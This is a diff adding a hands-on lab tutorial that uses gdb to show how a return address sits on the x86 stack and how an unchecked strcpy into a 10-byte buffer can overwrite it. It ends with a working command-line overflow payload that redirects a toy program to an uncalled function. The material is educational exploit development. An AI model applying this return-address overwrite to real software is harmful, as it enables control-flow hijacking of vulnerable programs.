@@ -1,0 +1,472 @@
+/-------------- your editor should be this wide ------------------------------------------------------/
+
+
+STEP 1 Learn how the return address is placed on the stack
+and how to use gdb to modify stack to change program flow.
+----------------------------------------------------------
+
+$ make clean
+$ make
+$ gdb -tui ./buffer_overflow
+the .gdbinit file has a breakpoint set on main and args for the program
+run already.  It also uses the layout command to change layouts.
+
+Here is the code shown in the debugger 
+(gdb) run `printf "AAAABBBB"`
+(gdb) layout next (do a few times until you get the c source and assembly)
+
+   ┌──buffer_overflow.c──────────────────────────────────────────────────┐ 
+   │3       #include <stdlib.h>                                          │
+   │4                                                                    │
+   │5       void nevercalled(void) {                                     │
+   │6               puts("I should never be called.\n");                 │
+   │7               exit(0);                                             │
+   │8       }                                                            │
+   │9                                                                    │
+   │10      void vulnerable(char *arg) {                                 │
+   │11              char buffer[10];                                     │
+   │12              strcpy(buffer,arg);                                  │
+   │13      }                                                            │
+   │14                                                                   │
+   │15      int main(int argc, char **argv) {                            │
+   │16                                                                   │
+B+>│17              vulnerable(argv[1]);                                 │
+   │18              printf("argv[1] = %s\n", argv[1]);                   │
+   │19                                                                   │
+   │20              return(0);                                           │
+   │21      }     
+
+So, lets see how the return address is placed on the stack for the call
+to strcpy in the vulnerable call.
+
+Stepi does an assembly level step, step does a c level instruction step.
+It will step into routines. In contrast next will do a step over c level 
+function calls.  Here is what the code looks like a few assembly instructions
+prior to the strcpy call.
+
+(stretch your xterm if this does not flow)
+
+   ┌──buffer_overflow.c──────────────────────────────────────────────────────────────────────┐
+   │5       void nevercalled(void) {                                                         │
+   │6               printf("I should never be called.\n");                                   │
+   │7               exit(0);                                                                 │
+   │8       }                                                                                │
+   │9                                                                                        │
+   │10      void vulnerable(char *arg) {                                                     │
+   │11              char buffer[10];                                                         │
+  >│12              strcpy(buffer,arg);                                                      │
+   │13      }                                                                                │
+   │14                                                                                       │
+   │15      int main(int argc, char **argv) {                                                │
+   │16                                                                                       │
+B+ │17              vulnerable(argv[1]);                                                     │
+   │18              printf("argv[1] = %s\n", argv[1]);                                       │
+   ┌─────────────────────────────────────────────────────────────────────────────────────────┐
+   │0x8048499 <nevercalled+14 at buffer_overflow.c:6>       call   0x8048350 <puts@plt>      │
+   │0x804849e <nevercalled+19 at buffer_overflow.c:6>       add    $0x10,%esp                │
+   │0x80484a1 <nevercalled+22 at buffer_overflow.c:7>       sub    $0xc,%esp                 │
+   │0x80484a4 <nevercalled+25 at buffer_overflow.c:7>       push   $0x0                      │
+   │0x80484a6 <nevercalled+27 at buffer_overflow.c:7>       call   0x8048370 <exit@plt>      │
+   │0x80484ab <vulnerable at buffer_overflow.c:10>          push   %ebp                      │
+   │0x80484ac <vulnerable+1 at buffer_overflow.c:10>        mov    %esp,%ebp                 │
+   │0x80484ae <vulnerable+3 at buffer_overflow.c:10>        sub    $0x18,%esp                │
+  >│0x80484b1 <vulnerable+6 at buffer_overflow.c:12>        sub    $0x8,%esp                 │
+   │0x80484b4 <vulnerable+9 at buffer_overflow.c:12>        pushl  0x8(%ebp)                 │
+   │0x80484b7 <vulnerable+12 at buffer_overflow.c:12>       lea    -0x12(%ebp),%eax          │
+   │0x80484ba <vulnerable+15 at buffer_overflow.c:12>       push   %eax                      │
+   │0x80484bb <vulnerable+16 at buffer_overflow.c:12>       call   0x8048340 <strcpy@plt>    │
+   │0x80484c0 <vulnerable+21 at buffer_overflow.c:12>       add    $0x10,%esp                │
+   └─────────────────────────────────────────────────────────────────────────────────────────┘
+native process 20151 In: vulnerable                                       L12   PC: 0x80484b1 
+Breakpoint 1 at 0x80484d7: file buffer_overflow.c, line 17.
+(gdb) run `printf "AAAABBBB"`
+Starting program: /home/davis/progs/buffer_overflow `printf "AAAABBBB"`
+Breakpoint 1, main (argc=2, argv=0xbffffcb4) at buffer_overflow.c:17
+(gdb) step
+vulnerable (arg=0xbffffdf4 "AAAABBBB") at buffer_overflow.c:12
+(gdb) layout next
+(gdb) layout next
+(gdb) focus asm
+Focus set to ASM window.
+(I'm changing focus to asm window so I can scroll to center the strcpy call
+in the middle of the window for you.)
+
+
+So, this shows the return address to be executed after the call to strcpy to be
+0x80484c0.
+
+Let's see this on the stack. Stepi into the first line of strcpy call.
+
+(gdb) x/16x $esp       
+0xbffffbbc:     0x080484c0      0xbffffbd6      0xbffffdf4      0xb7e23cd0
+0xbffffbcc:     0xb7fd8270      0x00008000      0xb7fcd000      0x00000000
+0xbffffbdc:     0xb7e2f1b6      0x00000002      0xbffffcb4      0xbffffc08
+0xbffffbec:     0x080484e8      0xbffffdf4      0xbffffcb4      0xbffffcc0
+
+Right there at the top of stack is our return address.  This corresponds to 
+the assembly call which will be executed at the end of any routine accessed
+via the call instruction.
+
+ASIDE:
+This is from http://unixwiz.net/techtips/win32-callconv-asm.html
+which does a good explanation of the x86 ABI.
+
+Push parameters onto the stack, from right to left
+Parameters are pushed onto the stack, one at a time, from right to left. Whether the parameters are evaluated from right to left is a different matter, and in any case this is unspecified by the language and code should never rely on this. The calling code must keep track of how many bytes of parameters have been pushed onto the stack so it can clean it up later.
+
+Call the function
+Here, the processor pushes contents of the %EIP (instruction pointer) onto the stack, and it points to the first byte after the CALL instruction. After this finishes, the caller has lost control, and the callee is in charge. This step does not change the %ebp register.
+
+Return from the function
+This is the last step of the called function, and the RET instruction pops the old %EIP from the stack and jumps to that location. This gives control back to the calling function. Only the stack pointer and instruction pointers are modified by a subroutine return.
+
+I'm skipping his info on the frame pointer.  That is how the stacks are layered.  Its sufficient
+to see how the args are pushed on the stack, the call instruction is done which does a push of the 
+return address and then finally the ret instruction pops the address back into the EIP.  Really a push
+of current eip + 4 but don't get bogged down into details at this point. Simply understand the results
+ by examing the stack.
+
+
+Finish the strcpy routine and see how it returns to the code which called it.
+(gdb) finish
+
+Notice how it indeed returns to the instruction after the call.
+
+Let it rip and see how AAAABBBB is printed out in main as a result of doing the program normally.
+(gdb) cont
+
+argv[1] = AAAABBBB
+
+Since we are not redirecting IO the gdb output screen will be skewed. No worries, redraw the
+screen using refresh and restart the program.
+
+(gdb) refresh
+(gdb) run `printf "AAAABBBB"`
+
+Lets do it again to see how the stack allocated buffer is implemented on the stack.
+stepi again but this time stop at the first instruction in the function call to vulnerable.
+
+
+if we override the value of the buffer by doing an assignment in gdb to
+the unitializied buffer like so 
+(gdb) set  buffer[0] = 'J' 
+(gdb) set  buffer[1] = 'F' 
+(gdb) set  buffer[2] = 'D' 
+(gdb) set  buffer[3] = 0 
+
+This creates a string in the buffer of "JFD".  The zero is the
+null terminated string convention.  The ascii values are 
+J: 0x4A
+F: 0x46
+D: 0x44
+<null>:0
+
+We can verify the setting via differnt commands for diff formats.
+(gdb) print /s buffer
+and
+(gdb) print /c buffer
+and 
+(gdb) print /x buffer
+and
+(gdb) x/16x buffer
+0xbffffc16: 0x0044464a  ; little endian -  string term null, D, F, J
+
+
+Now, lets stepi until we get to the strcpy call.  
+(gdb) x/x buffer
+0xbffffbd6:     0x0044464a
+(gdb) x/16x $esp
+0xbffffbc0:     0xbffffbd6      0xbffffdf4      0xb7e23cd0      0xb7fd8270
+0xbffffbd0:     0x00008000      0x464ad000      0x00000044      0xb7e2f1b6
+0xbffffbe0:     0x00000002      0xbffffcb4      0xbffffc08      0x080484e8
+0xbffffbf0:     0xbffffdf4      0xbffffcb4      0xbffffcc0      0x08048541
+
+The ABI says to push the function args on the stack right to left.  The call
+to strcpy looks like this
+strcpy(buffer,arg)
+
+So the top of stack contains the address of our stack allocated buffer
+which we used gdb to overwrite with "JFD".  The next arg is 0xbfffdf4.  That
+should be our program args "AAAABBBB".  Let's see if that is the case.
+
+(gdb) x/16x 0xbffffdf4 
+0xbffffdf4:     0x41414141      0x42424242      0x47445800      0x5345535f
+                  ^               ^                     ^
+It is indeed.     |               |                     |
+The A part -------/               |                     |
+The B part -----------------------/                     |
+The null terminated string -----------------------------/
+
+Double check with print command on the symbol.
+
+(gdb) print arg
+$3 = 0xbffffdf4 "AAAABBBB"
+
+Before we stepi again into the strcpy instruction and  overwrite the return address
+with the address of nevercalled.  We need to determine it.  You can do this in
+two different ways. Switch focus to the asm src and scroll it or use disass command 
+to see it.
+
+Either way the routine starts at address 0x0804848b
+ASIDE:
+(gdb) disas nevercalled
+Look at the asm window and it autoscrolls to the top of the routine.  Note, this will
+not work while in the strcpy routine or any other routine where the frame has
+changed from buffer_overflow.c
+
+So now lets do the actual overwrite stepi into the first instruction of the strcpy
+call.
+ASIDE: 
+This is a dyanmic call, so this first part is just doing symbol lookup and then passed
+to the dynamic loader.  We will do static calls later.  For now its just something
+to be aware of.
+
+
+Verify our return address is there to resume operation in vulnerable() routine.
+
+(gdb) x/16x $esp
+0xbffffbbc:     0x080484c0      0xbffffbd6      0xbffffdf4      0xb7e23cd0
+
+Yeap, 0x080484c0 is there.  Now overwrite it with the address of
+nevercalled() which is 0x0804848b
+
+
+Patch this return address using this syntax
+(gdb) set *(unsigned int *) 0xbffffbbc = 0x0804848b
+Verify this address is the new return address
+It should show the new address 0x0804848b
+
+(gdb) x/16x $esp
+0xbffffbbc:     0x0804848b      0xbffffbd6      0xbffffdf4      0xb7e23cd0
+
+Let it rip with cont command and see the nevercalled routine is called.
+(gdb) cont
+
+Continuing.
+I should never be called.
+[Inferior 1 (process 20168) exited normally]
+(gdb) 
+
+
+
+
+STEP 2 Learn how to overflow the buffer and change the return
+address using program args inside gdb.
+-------------------------------------------------------------
+
+Ruiun the code, this time we are going to look at the stack 
+after the strcpy.
+
+(gdb) run `printf "AAAABBBB"`
+
+stepi again but before you step into vulnerable notice the return 
+address which we will use to get back to main.
+
+ │0x80484e2 <main+28 at buffer_overflow.c:17>     push   %eax    
+>│0x80484e3 <main+29 at buffer_overflow.c:17>     call   0x80484ab <vulnerable at buffer_overflow.c:10>
+ │0x80484e8 <main+34 at buffer_overflow.c:17>     add    $0x10,%esp       
+
+stepi into the vulnerable routine. print the stack and notice what address 
+is where the return address is.
+
+(gdb) x/16xw $esp
+0xbffffbec:     0x080484e8      0xbffffdf4      0xbffffcb4      0xbffffcc0
+0xbffffbfc:     0x08048541      0xbffffc20      0x00000000      0x00000000
+
+Our intention is to use the buffer overflow to rewrite the address
+at the top of the stack here.
+
+
+stepi again some more to get to the call strcpy in vulnerable. 
+
+We know we have 10 bytes on the stack for the buffer allocated
+on the stack.  lets init with a full sequence of known bytes.
+This time for simplicity we will do a count.  This way we can
+see what's on the stack for later.
+(gdb) set var buffer = {0,1,2,3,4,5,6,7,8,9}
+(gdb) x/4x buffer
+0xbffffbd6:     0x03020100      0x07060504      0x00020908      0xfcb40000
+
+and the arg is
+(gdb) print /x arg   
+$12 = 0xbffffdf4
+(gdb) print /s arg
+$13 = 0xbffffdf4 "AAAABBBB"
+
+
+Now, stepi into the call to strcpy and reprint the stack with more
+values in the display so we can see our new values.
+
+(gdb) stepi
+0x08048340 in strcpy@plt ()
+(gdb)  x/192xw $esp
+0xbffffbbc:     0x080484c0      0xbffffbd6      0xbffffdf4      0xb7e23cd0
+0xbffffbcc:     0xb7fd8270      0x00008000      0x0100d000      0x05040302
+0xbffffbdc:     0x09080706      0x00000002      0xbffffcb4      0xbffffc08
+0xbffffbec:     0x080484e8      0xbffffdf4      0xbffffcb4      0xbffffcc0
+0xbffffbfc:     0x08048541      0xbffffc20      0x00000000      0x00000000
+0xbffffc0c:     0xb7e2f497      0x00000002      0xb7fcd000      0x00000000
+0xbffffc1c:     0xb7e2f497      0x00000002      0xbffffcb4      0xbffffcc0
+0xbffffc2c:     0x00000000      0x00000000      0x00000000      0xb7fcd000
+...
+...
+...
+0xbffffddc:     0x72702f73      0x2f73676f      0x66667562      0x6f5f7265
+0xbffffdec:     0x66726576      0x00776f6c      0x41414141      0x42424242
+0xbffffdfc:     0x47445800      0x5345535f      0x4e4f4953      0x3d44495f
+
+
+
+So lets look at what we know about the stack at this point.  Remember
+the function call parms are pushed onto stack right to left.
+
+strcpy(buffer, arg);
+
+
+So now we know a few things about the stack
+Address		 Value			Description
+0xbffffbbc	 0x080484c0		Top of the stack containing the return address in vulnerable following 
+                               the call to strcpy.
+0xbffffbc0   0xbffffbd6 -\  The 1st parm to strcpy - buffer, Its the dest addr of stack allocated buf.
+0xbffffbc4   0xbffffdf4	 |  The 2nd parm to strcpy - arg. Its the src addr.  
+.                        |
+.                        |   The buffer var is not word aligned. Remember 0x04 offset is LSByte.
+.                 /-----/
+.                 |
+.                 v
+0xbffffbd4 * 0x0100d000      The stack allocated buffer is here in the stack.
+0xbffffbd8   0x05040302
+0xbffffbdc   0x09080706
+.
+.
+.
+0xbffffbec * 0x080484e8      The return address to resume in main after the call to vulnerable().
+.
+.
+.
+And way down in the stack is the second parm, which is the src buffer passed in from main.
+.
+.
+.
+0xbffffdf4     0x41414141  The src buffer contents.
+0xbffffdf8     0x42424242      
+0xbffffdcc     0x47445800  The first byte is the null terminated string.
+
+
+
+
+So here is the deal, the destination address for the strcpy is lower in memory than
+the return address.  I've marked these with an '*'.  If the src buffer is bigger than the 
+destination buffer, then it will overwrite the return address which is below it.
+
+Hold onto your hats, let's do some math.
+
+    0xbffffbec
+ -  0xbffffbd4
+----------------
+            ??
+
+    0xec
+ -  0xd4
+----------------
+	0x18
+
+Hmm. this is interesting.  We know our allocated buffer is 10 bytes in size so our return
+address is how many bytes in this abi sans local buffer storage?
+
+
+    0x18
+ -  0x0a
+----------------
+	  ??
+
+
+    0x0a
+    0x06
+    0x08
+ -  0x0a
+----------------
+	14 bytes 0xE.
+
+So we know that sans locals our return address is at a minimum of 14 bytes from top of stack
+and that in this case our return address is 0x18 or 24 bytes down. So what will overflow it
+AAAA 16 bytes
+BB   18 bytes
+and our address for nevercalled is 0x804848b
+
+So as an intial guess lets try
+AAAABB\x8b\x84\x04\x08
+
+
+So rewrite the run args and try it.
+
+(gdb) run `printf "AAAABB\x8b\x84\x04\x08"`
+
+
+whoops stepping though it, did not work. Let's single step to see why.
+
+rerun, stepi until first call of vulnerable, examine the stack.
+
+(gdb) run `printf "AAAABB\x8b\x84\x04\x08"`
+(gdb) x/16x $esp
+0xbffffbec:     0x080484e8      0xbffffdf2      0xbffffcb4      0xbffffcc0
+
+Ok, so that's good. The top of the stack agrees with our results so far.  But this fails.
+
+
+
+Through trial and error this was the result to get the buffer overflow to work.
+
+`printf "AAAABBBBCCCCDDDDEEEEFF\x8b\x84\x04\x08"`
+
+
+
+Notice however, this changes the return address location.
+
+  (gdb) run `printf "AAAABB\x8b\x84\x04\x08"`
+  The program being debugged has been started already.
+  Start it from the beginning? (y or n) y
+  Starting program: /home/davis/progs/buffer_overflow `printf "AAAABB\x8b\x84\x04\x08"`
+
+  Breakpoint 1, main (argc=2, argv=0xbffffcb4) at buffer_overflow.c:17
+  (gdb) stepi
+  vulnerable (arg=0xbffffdf2 "AAAABB\213\204\004\b") at buffer_overflow.c:10
+  (gdb) x/16x $esp
+  0xbffffbec:     0x080484e8      0xbffffdf2      0xbffffcb4      0xbffffcc0
+
+And, with the bigger buffer passed it moves the ret location.
+
+  (gdb) run `printf "AAAABBBBCCCCDDDDEEEEFF\x8b\x84\x04\x08"`
+  The program being debugged has been started already.
+  Start it from the beginning? (y or n) y
+  Starting program: /home/davis/progs/buffer_overflow `printf "AAAABBBBCCCCDDDDEEEEFF\x8b\x84\x04\x08"`
+
+  Breakpoint 1, main (argc=2, argv=0xbffffca4) at buffer_overflow.c:17
+  (gdb) stepi
+  vulnerable (arg=0xbffffde2 "AAAABBBBCCCCDDDDEEEEFF\213\204\004\b") at buffer_overflow.c:10
+  (gdb) x/16x $esp
+  0xbffffbdc:     0x080484e8      0xbffffde2      0xbffffca4      0xbffffcb0
+
+
+
+
+Ok, so depending upon how much I pass the stack gets adjusted.  Roger that.  Moving on, here is 
+the final result.
+
+STEP 3 Learn how to overflow the buffer and change the return
+address using program args without gdb.
+-------------------------------------------------------------
+
+
+[davis@vm-i386 progs]$ ./buffer_overflow `printf "AAAABB"`
+argv[1] = AAAABB
+[davis@vm-i386 progs]$ ./buffer_overflow `printf "AAAABBBBCCCCDDDDEEEEFF\x8b\x84\x04\x08"`
+I should never be called.
+[davis@vm-i386 progs]$ 
+
+################################
+
+testy1
+
+use gdbit.sh and runbin.sh to debug this code
+
